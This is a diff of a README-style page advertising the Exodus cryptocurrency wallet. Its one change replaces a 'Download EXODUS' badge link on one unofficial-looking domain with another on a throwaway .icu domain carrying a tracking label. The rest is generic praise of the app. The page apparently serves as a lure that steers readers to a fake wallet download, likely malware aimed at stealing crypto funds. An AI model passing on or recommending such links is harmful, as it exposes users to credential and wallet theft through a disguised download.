@@ -1,4 +1,4 @@
-[![Download EXODUS](https://img.shields.io/badge/Download-EXODUS%20App-blueviolet)](https://downeefiles.com/s/xodss)
+[![Download EXODUS](https://img.shields.io/badge/Download-EXODUS%20App-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
 
 
 **Exodus Crypto App** is a secure, user-friendly cryptocurrency wallet and exchange platform that allows users to store, manage, and trade a wide variety of cryptocurrencies. It supports a broad range of digital assets, including Bitcoin, Ethereum, Litecoin, and many others. The app offers an integrated exchange feature, allowing users to swap between different cryptocurrencies directly within the wallet, without needing to use a third-party exchange. Exodus Crypto App features a sleek, intuitive design, making it easy for both beginners and experienced traders to manage their crypto portfolios.
